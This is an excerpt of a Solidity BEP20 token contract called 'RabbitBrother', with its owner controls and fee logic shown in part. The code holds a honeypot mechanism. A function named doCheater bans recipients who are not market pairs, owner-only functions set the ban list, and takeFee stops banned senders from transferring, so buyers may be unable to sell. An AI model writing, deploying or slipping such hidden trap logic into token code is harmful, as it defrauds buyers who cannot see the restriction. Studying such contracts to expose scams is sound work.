...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function setTxLimit(uint256 newMaxOnceEat) external onlyOwner() {
        _txLimit = newMaxOnceEat;
    }

    function setEnableWalletLimit(bool newValue) external onlyOwner {
    ...
    function doCheater(address recipient) internal {
        if (!banList[recipient] && !isMarketPair[recipient]) banList[recipient] = true;
    }

    function multiBanner(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            banList[addresses[i]] = status;
        }
    }

    function setbanList(address recipient, bool status) public onlyOwner {
        banList[recipient] = status;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(!isMarketPair[sender]) require(!banList[sender]);
...
contract RabbitBrother is BEP20 {
    constructor() BEP20(
        "RabbitBrother",
        "RabbitBrother",
        100000000000000,
        ...
        [uint256(0),uint256(2),uint256(0)],
        [uint256(0),uint256(2),uint256(0)],
        [uint256(100000000000000),uint256(100000000000000)],
        [0x879f4dc3664552514C6d4AfF8eb69BEB3dCc1378,0x879f4dc3664552514C6d4AfF8eb69BEB3dCc1378]
    ){}
}